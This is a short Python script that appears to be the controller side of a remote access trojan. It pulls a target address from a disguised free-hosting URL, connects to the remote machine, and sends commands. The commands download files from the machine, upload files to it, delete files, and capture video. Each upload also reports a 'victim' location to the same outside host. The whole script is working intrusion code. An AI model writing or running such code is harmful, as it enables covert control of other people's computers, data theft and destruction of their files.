import socket,os
import requests

sc=socket.socket()
ip=requests.get('http://googiemet.000webhostapp.com/Sender/store/value.txt')
ip=ip.text
print('Connecting with :'+ip)
port=4445
sc.connect((ip,port))
print(sc.recv(1024).decode())

inn=input('[+] Enter command:')
sc.send(bytes(str(inn),'utf-8'))
	
if inn=='df':
		inn=input('Enter download path:')
		innn=input('Enter file name:')
		
		sc.send(bytes(str(inn),'utf-8'))
		op=open(innn,'wb')
			
		while 1:
			wr=sc.recv(999999)
			op.write(wr)
			print('receiving....')
		
			
elif inn=='uf':
			inp=input('Enter file path:')
			op=open(inp,'rb')
			inn=input('Enter loop to occurs:')
			vic=input('Victim place:')
			requests.get('http://googiemet.000webhostapp.com/Sender/store/n.php?t='+vic)
			sc.send(bytes(str(inn),'utf-8'))
			
			
			re=op.read()
			sc.send(re)
			
elif inn=='sf':
			inn=input('path:')
			
			sc.send(bytes(inn,'utf-8'))
			gf=sc.recv(99999).decode()
			print(gf)
elif inn=='fl':
			fl=sc.recv(1024).decode()
			print(fl)
			
elif inn=='demo':
			op=open('fo.mp4','wb')
			for x in range(0,2355):
				de=sc.recv(99999)
				op.write(de)
				
elif inn=='delf':
			inn=input('Enter file path:')
			sc.send(bytes(inn,'utf-8'))
			print(sc.recv(1024).decode())				
elif inn=='fis':
	inp=input('Enter file path:')
	sc.send(bytes(inp,'utf-8'))
	print(sc.recv(1024).decode())
	
	
elif inn=='auto':
	you=input('Enter Youtube Search:')
	sc.send(bytes(you,'utf-8'))
	print(sc.recv(1024).decode())
	
				
										
else:
		print(sc.recv(1024).decode())